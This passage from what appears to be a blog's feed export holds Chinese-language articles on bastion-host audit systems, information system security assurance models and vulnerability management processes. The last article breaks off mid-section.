        <content type="html"><![CDATA[<h2 id="一、什么是运维安全管理与审计系统"><a href="#一、什么是运维安全管理与审计系统" class="headerlink" title="一、什么是运维安全管理与审计系统"></a>一、什么是运维安全管理与审计系统</h2><p>运维安全管理与审计系统（俗称 “堡垒机”）：是采用新一代智能运维技术框架，基于认证、授权、访问、审计的管理流程设计理念，实现对企事业IT中心的网络设备、数据库、安全设备、主机系统、中间件等资源统一运维管理和审计；通过集中化运维管控、运维过程实时监管、运维访问合规性控制、运维过程图形化审计等功能，为企事业IT中心运维构建一套事前预防、事中监控、事后审计完善的安全管理体系。</p><p>简单的说，运维安全管理与审计系统（堡垒机）就是用来控制哪些人可以登录哪些资产（事先防范和控制），以及录像记录登录资产后做了什么事情（事中监控和事后溯源）的系统。其核心是<strong>可控及审计</strong>。可控是指权限可控、行为可控。权限可控指可以方便的设置、回收运维操作人员的权限；行为可控，比如需要集中禁用某个危险命令；可审计，指有权限操作的人员对资产的所有操作都有记录，能够被监控和审计。</p><h2 id="二、为什么需要运维安全管理与审计系统"><a href="#二、为什么需要运维安全管理与审计系统" class="headerlink" title="二、为什么需要运维安全管理与审计系统"></a>二、为什么需要运维安全管理与审计系统</h2><p>当企业的IT资产越来越多，当参与运维的岗位越来越多样性，运维团队达到一定的规模，不同的人员如运维人员、开发人员、第三方代维、厂商支撑人员需要控制访问不同的资产及权限，如果没有一套好的机制，就会产生混乱。无法有效的做到“哪些人允许以什么样的身份访问哪些设备”，更加没有办法知道“哪些人登录设备后做了哪些事情”，出了问题以后无法回溯。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/%E8%BF%90%E7%BB%B4%E6%B7%B7%E4%B9%B1.png" alt="运维混乱"></p><p>运维安全管理与审计系统（堡垒机）是从跳板机（也叫前置机）的概念演变过来的。早在2000年左右，一些中大型企业为了能对运维人员的远程登录进行集中管理，会在机房部署一台跳板机。跳板机其实就是一台unix/linux/windows操作系统的服务器，所有运维人员都需要先远程登录跳板机，然后再从跳板机登录其他服务器中进行运维操作。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/%E8%B7%B3%E6%9D%BF%E6%9C%BA.png" alt="跳板机"></p><p>跳板机解决了远程登录集中管理访问的问题，但跳板机并没有实现对运维人员操作行为的控制和审计，使用跳板机过程中还是会有误操作、违规操作导致的操作事故，一旦出现操作事故很难快速定位原因和责任人。此外，跳板机存在严重的安全风险，一旦跳板机系统被攻入，则将后端资源风险完全暴露无遗。同时，对于个别资源（如telnet）可以通过跳板机来完成一定的内控，但是对于更多更特殊的资源（ftp、rdp等）来讲就显得力不从心了。</p><p>人们逐渐认识到跳板机的不足，进而需要更新、更好的安全技术理念来实现运维操作管理。需要一种能满足角色管理与授权审批、信息资源访问控制、操作记录和审计、系统变更和维护控制要求，并生成一些统计报表配合管理规范来不断提升IT内控的合规性的产品。在这些理念的指导下，2005年前后，运维安全管理与审计系统（堡垒机）开始以一个独立的产品形态被广泛部署，有效地降低了运维操作风险，使得运维操作管理变得更简单、更安全。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/%E5%A0%A1%E5%9E%92%E6%9C%BA.png" alt="堡垒机"></p><p>运维安全管理与审计系统（堡垒机）承担了运维人员在运维过程中唯一的入口，通过精细化授权以明确“哪些人以什么身份访问了哪些设备”，从而让运维混乱变得有序起来，堡垒机不仅可以明确每一个运维人员的访问路径，还可以将每一次访问及操作过程变得可以“审计”，就像飞机中的黑匣子，汽车上的行车记录仪，能够做到针对运维人员的每次一操作均可以录像、全程审计，一但出了问题，可以追踪溯源。</p><p>运维安全管理与审计系统的目标可以概括为5W，主要是为了降低运维风险。具体如下：</p><ul><li>审计：你做了什么？（What） </li><li>授权：你能做哪些？（Which） </li><li>账号：你要去哪？（Where） </li><li>认证：你是谁？（Who）</li><li>来源：访问时间？（When）</li></ul><p>运维安全管理与审计系统实现：</p><ul><li>事前预防：建立“自然人-资源-资源账号”关系，实现统一认证和授权 </li><li>事中控制：建立“自然人-操作-资源”关系，实现操作审计和控制</li><li>事后审计：建立“自然人-资源-审计日志”关系，实现事后溯源和责任界定</li></ul><h2 id="三、运维安全管理与审计系统原理"><a href="#三、运维安全管理与审计系统原理" class="headerlink" title="三、运维安全管理与审计系统原理"></a>三、运维安全管理与审计系统原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>运维安全管理与审计系统（堡垒机），主要采用4A管理模型，对IT运维操作进行访问控制和行为审计的合规性管控系统，主要用来解决企业IT运维部门账号管理混乱，身份冒用、滥用，授权控制不明确，操作行为不规范，事件责任无法定位等问题。<br><strong>4A 是指认证 Authentication、授权 Authorization、账号 Account、审计 Audit</strong>，中文名称为统一安全管理平台解决方案。即将身份认证、授权、记账和审计定义为网络安全的四大组成部分，从而确立了身份认证在整个网络安全系统中的地位与作用。<br>具体来说：</p><ul><li>集中认证 (authentication) 管理<br>可以根据用户应用的实际需要，为用户提供不同强度的认证方式，既可以保持原有的静态口令方式，又可以提供具有双因子认证方式的高强度认证（一次性口令、数字证书、动态口令），而且还能够集成现有其它如生物特征等新型的认证方式。不仅可以实现用户认证的统一管理，并且能够为用户提供统一的认证门户，实现企业信息资源访问的单点登录。</li><li>集中权限 (authorization) 管理<br>可以对用户的资源访问权限进行集中控制。它既可以实现对 B/S、C/S 应用系统资源的访问权限控制，也可以实现对数据库、主机及网络设备的操作的权限控制，资源控制类型既包括 B/S 的 URL、C/S 的功能模块，也包括数据库的数据、记录及主机、网络设备的操作命令、IP 地址及端口。</li><li>集中帐号（account）管理<br>为用户提供统一集中的帐号管理，支持管理的资源包括主流的操作系统、网络设备和应用系统；不仅能够实现被管理资源帐号的创建、删除及同步等帐号管理生命周期所包含的基本功能，而且也可以通过平台进行帐号密码策略，密码强度、生存周期的设定。</li><li>集中审计 (audit) 管理<br>将用户所有的操作日志集中记录管理和分析，不仅可以对用户行为进行监控，并且可以通过集中的审计数据进行数据挖掘，以便于事后的安全事故责任的认定。</li></ul><h3 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h3><p>实现的技术架构如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84.png" alt="堡垒机技术架构"></p><h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h3><p>主要核心功能包括：<br><strong>1、访问控制</strong><br>通过对访问资源的严格控制，堡垒机可以确保运维人员在其账号有效权限、期限内合法访问操作资源，降低操作风险，以实现安全监管目的，保障运维操作人员的安全、合法合规、可控制性。<br><strong>2、账号管理</strong><br>当运维人员在使用堡垒机时，无论是使用云主机还是局域网的主机，都可以同步导入堡垒机进行账号集中管理与密码的批量修改，并可一键批量设置SSH秘钥对等。<br><strong>3、资源授权</strong><br>支持云主机、局域网主机等多种形式的主机资源授权，并且堡垒机采用基于角色的访问控制模型，能够对用户、资源、功能作用进行细致化的授权管理，解决人员众多、权限交叉、资产繁琐、各类权限复制等众多运维人员遇到的运维难题。<br><strong>4、指令审核</strong><br>对运维人员的账号使用情况，包括登录、资源访问、资源使用等。针对敏感指令，堡垒机可以对非法操作进行阻断响应或触发审核的操作情况，审核未通过的敏感指令，堡垒机将进行拦截。<br><strong>5、审计录像</strong><br>除了可以提供安全层面外，还可以利用堡垒机的事前权限授权、事中敏感指令拦截外，以及堡垒机事后运维审计的特性。运维人员在堡垒机中所进行的运维操作均会以日志的形式记录，管理者即通过日志对微云人员的操作进行安全审计录像。<br><strong>6、身份认证</strong><br>为运维人员提供不同强度的认证方式，既可以保持原有的静态口令方式，还可以提供微信、短信等认证方式。堡垒机不仅可以实现用户认证的统一管理，还能为运维人员提供统一一致的认证门户，实现企业的信息资源访问的单点登录。<br><strong>7、操作审计</strong><br>将运维人员所有操作日志集中管理与分析，不仅可以对用户行为进行监控与拦截，还可以通过集中的安全审计数据进行数据挖掘，以便于运维人员对安全事故的操作审计认定。</p><h2 id="四、运维安全管理与审计系统部署方式"><a href="#四、运维安全管理与审计系统部署方式" class="headerlink" title="四、运维安全管理与审计系统部署方式"></a>四、运维安全管理与审计系统部署方式</h2><h3 id="1、单机部署"><a href="#1、单机部署" class="headerlink" title="1、单机部署"></a>1、单机部署</h3><p>堡垒机主要都是旁路部署，旁挂在交换机旁边，只要能访问所有设备即可。<br>部署特点：<br>旁路部署，逻辑串联。<br>不影响现有网络结构。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2.png" alt="单机部署"></p><h3 id="2、HA高可靠部署"><a href="#2、HA高可靠部署" class="headerlink" title="2、HA高可靠部署"></a>2、HA高可靠部署</h3><p>旁路部署两台堡垒机，中间有心跳线连接，同步数据。对外提供一个虚拟IP。用户通过堡垒机虚拟IP进行访问，堡垒机自动进行会话负载分配和数据同步、冗余存储。<br>部署特点：<br>两台硬件堡垒机，一主一备/提供VIP。<br>当主机出现故障时，备机自动接管服务。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220511/HA%E9%AB%98%E5%8F%AF%E9%9D%A0%E9%83%A8%E7%BD%B2.png" alt="HA高可靠部署"></p><h2 id="五、常见运维安全管理与审计系统产品"><a href="#五、常见运维安全管理与审计系统产品" class="headerlink" title="五、常见运维安全管理与审计系统产品"></a>五、常见运维安全管理与审计系统产品</h2><h3 id="商用"><a href="#商用" class="headerlink" title="商用"></a>商用</h3><p>奇安信[运维安全管理与审计系统]：<a href="https://www.qianxin.com/product/detail/pid/385" target="_blank" rel="noopener">https://www.qianxin.com/product/detail/pid/385</a><br>亚信安全[信磐堡垒机]：<a href="https://www.asiainfo-sec.com/product/detail-27.html" target="_blank" rel="noopener">https://www.asiainfo-sec.com/product/detail-27.html</a><br>绿盟[绿盟运维安全管理系统]：<a href="https://www.nsfocus.com.cn/html/2019/212_0926/20.html" target="_blank" rel="noopener">https://www.nsfocus.com.cn/html/2019/212_0926/20.html</a><br>启明星辰[堡垒机]：<a href="https://www.venustech.com.cn/new_type/blj/" target="_blank" rel="noopener">https://www.venustech.com.cn/new_type/blj/</a></p><h3 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h3><p>麒麟堡垒机：<a href="http://www.secvpn.com.cn/" target="_blank" rel="noopener">http://www.secvpn.com.cn/</a><br>飞致JumpServer堡垒机：<a href="https://fit2cloud.com/jumpserver/index.html" target="_blank" rel="noopener">https://fit2cloud.com/jumpserver/index.html</a></p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之信息系统安全保障</title>
      <link href="/posts/61446357/"/>
      <url>/posts/61446357/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息系统安全保障相关概念"><a href="#一、信息系统安全保障相关概念" class="headerlink" title="一、信息系统安全保障相关概念"></a>一、信息系统安全保障相关概念</h2><p>信息系统是用于采集、处理、存储、传输、分发和部署信息的整个基础设施、组织结构、人员和组件的总和。随着当前社会信息化程度的不断提高，各类信息系统越来越成为其所从属的组织机构生存和发展的关键因素，信息系统的安全风险也成为组织风险的一部分。同时，信息系统受来自于组织内部与外部环境的约束，信息系统的安全保障除了要充分分析信息系统本身的技术、业务、管理等特性，还要考虑这些约束条件所产生的要求。为了保障组织机构完成使命，系统安全管理人员必须针对信息系统面临的各种各样的风险制定相应的策略。</p><p>信息系统安全保障是在信息系统的整个生命周期中，通过对信息系统的风险分析，制定并执行相应的安全保障策略，从技术、管理、工程和人员等方面提出信息安全保障要求，确保信息系统的保密性、完整性和可用性，把安全风险降到可接受的程度，从而保障系统能够顺利实现组织机构的使命。</p><p>信息系统安全保障工作就是针对信息系统在运行环境中所面临的各种风险，制定信息安全保障策略体系，在策略指导下，设计并实现信息安全保障架构或模型，采取技术、管理等安全保障措施，将风险降至预定可接受的程度，从而保障其使命要求。策略体系是组织机构在对风险、资产和使命综合理解的基础上所做出的指导文件。策略体系的制定，反映了组织机构对信息系统安全保障及其目标的理解，它的制定和贯彻执行对组织机构信息系统安全保障起着纲领性的指导作用。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220429/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%85%B3%E7%B3%BB.png" alt="信息系统安全概念和关系" title="信息系统安全概念和关系"></p><p>信息系统安全保障工作的基础和前提是风险管理。信息安全策略必须以风险管理为基础，针对可能存在的各种威胁和自身存在的弱点，采取有针对性的防范措施。</p><h2 id="二、信息系统安全保障模型"><a href="#二、信息系统安全保障模型" class="headerlink" title="二、信息系统安全保障模型"></a>二、信息系统安全保障模型</h2><p>信息系统安全保障模型包含保障要素、生命周期和安全特征3个方面。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220429/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BF%9D%E9%9A%9C%E6%A8%A1%E5%9E%8B.png" alt="信息系统安全保障模型" title="信息系统安全保障模型"></p><p>信息系统安全保障模型的主要思路是以风险和策略为基础，在整个信息系统的生命周期中实施技术、管理、工程和人员保障要素。通过信息系统安全保障实现信息安全的安全特征：信息的保密性、完整性和可用性特征，从而达到保障组织机构执行其使命的根本目的。</p><p>模型特点：</p><ul><li>将风险和策略作为信息系统安全保障的基础和核心。</li><li>强调信息系统安全保障应贯穿于整个信息系统生命周期的全过程。</li><li>强调综合保障的观念。通过综合技术、管理、工程和人员要素来保障信息系统安全。</li></ul><h3 id="1、基于信息系统生命周期的信息安全保障"><a href="#1、基于信息系统生命周期的信息安全保障" class="headerlink" title="1、基于信息系统生命周期的信息安全保障"></a>1、基于信息系统生命周期的信息安全保障</h3><p>信息系统的生命周期层面和保障要素层面不是相互孤立的，而是相互关联、密不可分的。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220429/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BF%9D%E9%9A%9C%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%BF%9D%E9%9A%9C%E8%A6%81%E7%B4%A0.png" alt="信息系统安全保障生命周期的安全保障要素" title="信息系统安全保障生命周期的安全保障要素"></p><p>在信息系统生命周期模型中，将信息系统的整个生命周期抽象成计划组织、开发采购、实施交付、运行维护和废弃5个阶段，加上在运行维护阶段的变更产生的反馈，形成信息系统生命周期完整的闭环结构。在信息系统生命周期中的任何时间点上，都需要综合信息系统安全保障的技术、管理、工程和人员保障要素。</p><ul><li>计划组织阶段 ：根据组织机构的业务要求、法律法规的要求、系统所存在的风险等因素，产生了信息系统安全保障需求。在此阶段，信息安全策略应加入信息系统建设和使用的决策中。从信息系统建设开始，就应该综合考虑系统的安全保障要求，确保信息系统建设和信息系统安全保障建设同步规划、同步实施。也就是我们平时讲的信息系统和安全保障要“三同步”–同步规划、同步建设、同步使用。</li><li>开发采购阶段：此阶段是计划组织阶段的细化和具体体现。在此阶段中，进行系统安全需求分析、系统安全体系设计以及相关预算申请和项目准备等活动。在此阶段，应克服传统拘泥于具体技术的片面性，要综合考虑系统的风险和安全策略，将信息系统安全保障作为一个个整体，进行系统地设计，建立信息系统安全保障整体规划和全局视野。组织机构可根据具体要求，对系统整体的技术、管理安全保障规划或设计进行评估，以保证对信息系统的整体规划满足组织机构的建设要求和相关国家与行业的要求。</li><li>实施交付阶段：在此阶段，组织机构可通过对承建方进行信息安全服务资格要求和人员专业资格要求以确保施工组织的服务能力；组织机构还可通过信息系统安全保障工程保障对实施施工过程进行监理和评估,最终确保所交付系统的安全性。</li><li>运行维护阶段：信息系统进人运行维护阶段后，对信息系统的管理、运行维护和使用人员的能力等方面进行综合保障,是信息系统得以安全正常运行的根本保证。</li><li>变更：信息系统投入运行后并不是- - 成不变的，它随着业务和需求的变更、外界环境的变更产生新的要求或增强原有的要求，重新进人信息系统组织计划阶段(即规划阶段)。</li><li>废弃阶段：当信息系统不再满足业务要求时，信息系统进入废弃阶段，在这个阶段，需要考虑信息安全销毁等要素。</li></ul><p>这样，通过在信息系统生命周期所有阶段融人信息系统安全保障概念，确保了信息系统的持续动态安全保障。</p><h3 id="2、信息安全保障要素"><a href="#2、信息安全保障要素" class="headerlink" title="2、信息安全保障要素"></a>2、信息安全保障要素</h3><h4 id="1）信息安全技术"><a href="#1）信息安全技术" class="headerlink" title="1）信息安全技术"></a>1）信息安全技术</h4><p>信息安全技术体系包括以下几个方面。</p><ul><li>密码技术：密码技术及应用涵盖了数据处理过程的各个环节，如数据加密、密码分析、数字签名、身份识别、秘密分享等。通过以密码学为核心的信息安全理论与技术保证数据的机密性和完整性等要求。<br>访问控制技术：在为用户对系统资源提供最大限度共享的基础上，对用户的访问权进行管理，防止对信息的非授权篡改和滥用。访问控制对经过身份鉴别后的合法用户提供所需要的且经过授权的服务,拒绝用户越权的服务请求，保证用户在系统安全策略下有序工作。</li><li>审计和监控技术：审计是事后认定违反安全规则行为的分析技术，在检测违反安全规则方面、准确发现系统发生的事件以及对事件发生的事后分析方面，审计都发挥着巨大的作用。审计技术的发展，来源于对访问的跟踪，这些访问包括对保存在计算机系统中敏感及重要信息的访问和对计算机系统资源的访问。网络安全监控包括主动监控和被动监控。它依赖于在任何给定时间内网络组件和检测器记录下已经发生的事情，接收日志信息，并对它进行分析。</li><li>网络安全技术：这些技术包括网络协议安全、防火墙技术、人侵检测系统/人侵防御系统( Intrusion Detection System/Intrusion Prevention System, IDS/IPS )安全管理平台( Security Operations Center， SOC )、统一威胁管理( Unified Threat Management, UTM )等。网络安全技术主要是保护网络的安全，防止入侵攻击行为的发生。防火墙是一个位于可信网络和不可信网络之间的边界防护系统。防病毒网关防止基于HTTP/FTP/SMTP/POP3/HTTPS等网络协议侵人网络内部的病毒进行过滤。人侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报措施的网络安全设备。人侵防御系统是监视网络传输行为的安全技术，它能够即时地中断、调整或隔离一些异常或是具有伤害性的网络传输行为。</li><li>操作系统与数据库安全技术：操作系统安全技术主要包括身份鉴别、访问控制 、文件系统安全、安全审计等方面。数据库安全技术包括数据库的安全特性和安全功能，数据库完整性要求和备份恢复，以及数据库安全防护、安全监控和安全审计等。</li><li>安全漏洞与恶意代码：包括安全漏洞的成因、分类、发掘方法，以及如何修复等;以及恶意代码的加载、隐藏和自我保护技术,恶意代码的检测原理及清除方法等。</li><li>软件安全开发：包括软件安全开发模型、软件安全开发关键阶段的安全控制措施等内容。</li></ul><h4 id="2）信息安全管理"><a href="#2）信息安全管理" class="headerlink" title="2）信息安全管理"></a>2）信息安全管理</h4><p>信息安全管理体系，是组织在整体或特定范围内建立信息安全方针和目标，以及完成这些目标所用方法的体系。基于对业务风险的认识、ISMS包括建立、实施、操作、监视、复查、维护和改进信息安全等一系列的管 理活动，并且表现为组织结构、策略方针、计划活动、目标与原则、人员与责任、过程与方法、资源等诸多要素的集合。</p><p>风险管理是指以风险为主线进行信息安全的管理，它的实施目标就是要依据安全标准和信息系统的安全需求，对信息、信息载体、信息环境进行安全管理，以达到安全目标。</p><p>风险管理贯穿于整个信息系统生命周期，包括对象确立、风险评估、风险控制、审核批准、监控与审查、沟通与咨询等6个方面的内容。其中，对象确立、风险评估、风险控制和审核批准是信息安全风险管理的4个基本步骤，监控与审查、沟通与咨询则贯穿于这4个基本步骤中。</p><h4 id="3）信息安全工程"><a href="#3）信息安全工程" class="headerlink" title="3）信息安全工程"></a>3）信息安全工程</h4><p>信息安全工程涉及系统和应用的开发、集成、操作、管理、维护和进化以及产品的开发、交付和升级。</p><p>系统安全工程能力成熟模型(Systems Security Engineering Capability Maturity Model，SSE-CMM)描述了一个组织的系统安全工程过程必须包含的基本特征。这些特征是完善的安全工程保证，也是系统安全工程实施的度量标准，同时还是一个易于理解的评估系统安全工程实施的框架。</p><h4 id="4）信息安全人才"><a href="#4）信息安全人才" class="headerlink" title="4）信息安全人才"></a>4）信息安全人才</h4><p>信息安全保障诸要素中，人是最关键也是最活跃的要素。网络攻防对抗，最终较量的是攻防两端的人，而不是设备。对组织机构来说，应建立一个完整的信息安全人才体系。<br>信息安全人才体系应包括以下方面。</p><ul><li>所有员工：需要进行信息安全保障意识教育，具体可以采用内部培训、在组织机构网站上发布相关信息等措施来增强所有员工的安全意识。</li><li>涉及信息系统的岗位和职责的员工：需要进行相应的信息安全保障的基本技能培训。</li><li>信息安全专业人员：应建立更全面、更专业的信息安全保障知识和经验。</li></ul><p>本文节选自：<br>《信息安全技术 信息系统安全保障评估框架：简介和一般模型》GB_T 20274.1 200<br>《CISP培训教材》</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之漏洞管理</title>
      <link href="/posts/a937cbf5/"/>
      <url>/posts/a937cbf5/</url>
      
        <content type="html"><![CDATA[<p>1947年冯·诺依曼建立计算机系统结构理论时认为，计算机系统也有天生的类似基因的缺陷，也可能在使用和发展过程中产生意想不到的问题。20世纪七八十年代，早期黑客的出现和第一个计算机病毒的产生，软件漏洞逐渐引起人们的关注。在各种产品、主机、网络和复杂信息系统中，安全漏洞以不同形式存在，而且数量逐年增加，利用漏洞造成的各类安全事件层出不穷。攻击行为或网络安全事件的发生正越来越多地受到利益驱动的影响，这种“黑色产业链”的兴起，导致越来越多的网络终端受害，大量机密信息被窃取，敏感数据信息在互联网上传播，并在黑市中待价而沽。工业控制领域以及新技术新应用的安全漏洞，特别是基础核心系统的安全漏洞已经成为危害国家经济和发展安全的重要因素。在安全运营过程中一个最重要的工作就是漏洞管理。</p><h2 id="一、什么是安全漏洞"><a href="#一、什么是安全漏洞" class="headerlink" title="一、什么是安全漏洞"></a>一、什么是安全漏洞</h2><p><strong>安全漏洞（Vulnerability）也被称为脆弱性</strong>。<br>根据国标-信息安全技术-安全漏洞标识与描述规范[GB/T 28458-2012]对安全漏洞的定义，安全漏洞是计算机信息系统在需求、设计、实现、配置运行等过程中，有意或无意产生的缺陷。这些缺陷以不同形式存在于计算机信息系统的各个层次和环节之中，一旦被恶意主体所利用，就会对计算机信息系统的安全造成损害，从而影响计算机信息系统的正常运行，危害信息产品或系统及信息的安全属性。</p><p>有时漏洞也被称作错误( Error)、缺陷 ( Fault)、 弱点( Weakness )或是故障( Failure )等，这些术语很容易引起混淆。在许多情况下，人们习惯于将错误、缺陷、弱点都简单地称为漏洞。需要指出的是，严格地说，错误、缺陷、弱点和故障并不等于漏洞。错误、缺陷和弱点是产生漏洞的条件，漏洞被利用后必然会破坏安全属性，但不一定能引起产品或系统故障。</p><h2 id="二、安全漏洞标识与描述"><a href="#二、安全漏洞标识与描述" class="headerlink" title="二、安全漏洞标识与描述"></a>二、安全漏洞标识与描述</h2><p>以下为国标-信息安全技术-安全漏洞标识与描述规范[GB/T 28458-2012] 对安全漏洞标识与描述的定义：<br>安全漏洞描述项包括标识号、名称、发布时间、发布单位、类别、等级、影响系统等必须的描述项，并可更具需要扩充（但不限于）相关编号、利用方法、解决方案建议、其他描述等描述项。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220425/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0.png" alt="安全漏洞描述"></p><p><strong>标识号</strong><br>CVD-YYYY-NNNNNN格式为标识号。CVD为Common V ulnerabilities Description 的缩写；YYYY为4位十进制数字，表示产生本安全漏洞的年份；NNNNNN为6位十进制数字,表示当年内产生的安全漏洞的序号。<br><strong>名称</strong><br>安全漏洞标题，概括性描述安全漏洞信息的短语,例如InternetExplorer8.0缓冲区溢出漏洞。<br><strong>发布时间</strong><br>安全漏洞信息发布日期。<br><strong>发布单位</strong><br>发布安全漏洞的单位全称。<br><strong>类别</strong><br>安全漏洞所属分类，说明安全漏洞分类归属的信息。<br><strong>等级</strong><br>安全漏洞危害级别，说明安全漏洞能够造成的危害程度。<br><strong>影响系统</strong><br>安全漏洞所影响系统的信息，例如厂商、产品名称和版本号等。<br><strong>相关编号</strong><br>安全漏洞的其他相关编号,例如Bugtraq编号、CVE编号等。<br><strong>利用方法</strong><br>安全漏洞利用的方法，例如安全漏洞攻击方案或利用代码。<br><strong>解决方案建议</strong><br>安全漏洞的解决方案，例如补丁信息等。<br><strong>其他描述</strong><br>安全漏洞描述需要说明的其他相关信息，例如安全漏洞产生的具体原因。</p><h2 id="三、安全漏洞的分类分级"><a href="#三、安全漏洞的分类分级" class="headerlink" title="三、安全漏洞的分类分级"></a>三、安全漏洞的分类分级</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>网络安全漏洞分类是基于漏洞产生或触发的技术原因对漏洞进行划分，分类如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220425/%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB.png" alt="安全漏洞分类"></p><h3 id="分级"><a href="#分级" class="headerlink" title="分级"></a>分级</h3><p>网络安全漏洞分级是指采用分级的方式对网络安全漏洞潜在危害的程度进行描述，包括技术分级<br>和综合分级两种分级方式，每种方式均分为超危（严重）、高危、中危和低危四个等级,具体内容如下:<br><strong>超危（严重）</strong>：漏洞可以非常容易地对目标对象造成特别严重后果；<br><strong>高危</strong>：漏洞可以容易地对目标对象造成严重后果；<br><strong>中危</strong>：漏洞可以对目标对象造成一般后果，或者比较困难地对目标造成严重后果；<br><strong>低危</strong>：漏洞可以对目标对象造成轻微后果，或者比较困难地对目标对象造成一般严重后果，或<br>者非常困难地对目标对象造成严重后果。</p><h2 id="四、安全漏洞的生命周期"><a href="#四、安全漏洞的生命周期" class="headerlink" title="四、安全漏洞的生命周期"></a>四、安全漏洞的生命周期</h2><p>依据信息安全漏洞从产生到消亡的整个过程，信息安全漏洞生命周期分以下几个阶段：<br>a)漏洞的发现：通过人工或者自动的方法分析、挖掘漏洞的过程，并且该漏洞可以被验证和重现。<br>b)漏洞的利用：利用漏洞对计算机信息系统的保密性、完整性和可用性造成损害的过程。<br>c)漏洞的修复：通过补丁、升级版本或配置策略等对漏洞进行修补的过程，使得该漏洞不能够被<br>恶意主体所利用。<br>d)漏洞的公开：通过公开渠道(如网站、邮件列表等)公布漏洞信息的过程。</p><h2 id="五、安全漏洞的闭环管理"><a href="#五、安全漏洞的闭环管理" class="headerlink" title="五、安全漏洞的闭环管理"></a>五、安全漏洞的闭环管理</h2><p>根据漏洞生命周期中漏洞所处的不同状态，将漏洞管理行为对应为<strong>预防</strong>、<strong>收集</strong>、<strong>消减</strong>和<strong>发布</strong>等活动。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220425/%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="漏洞生命周期"></p><p>预防是指通过各种安全手段提高信息系统的安全水平，避免漏洞的产生和恶意利用。<br>收集是针对已发现的漏洞进行信息的及时跟踪与获取。<br>消减是指在漏洞被发现后积极采取补救措施,最大限度减少漏洞带来的损失。<br>发布是指在遵循一定的发布策略的前提下,对漏洞及其修复信息进行发布。<br>用户、厂商和漏洞管理组织可以根据漏洞的状态及管理活动建立符合自身特点的漏洞处理策略和处理流程。<br>对于企业组织安全运营来说可以参考以下漏洞处理流程：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220425/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E6%B5%81%E7%A8%8B.png" alt="漏洞处理流程"></p><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><p>一般由渗透测试工程师通过漏洞扫描工具或渗透测试发现系统漏洞，提交渗透测试报告。由安全工程师进行漏洞验证，确定系统漏洞是否真实存在。</p><h3 id="漏洞录入"><a href="#漏洞录入" class="headerlink" title="漏洞录入"></a>漏洞录入</h3><p>在漏洞验证完成后，安全工程师需要根据企业内部的漏洞等级划分标准，将存在的漏洞录入漏洞管理系统。</p><h3 id="漏洞分发"><a href="#漏洞分发" class="headerlink" title="漏洞分发"></a>漏洞分发</h3><p>漏洞管理系统根据漏洞所影响的业务系统、主机IP等匹配到系统负责部门和修复人。通知系统负责人进行修复加固等。</p><h3 id="漏洞跟进及修复"><a href="#漏洞跟进及修复" class="headerlink" 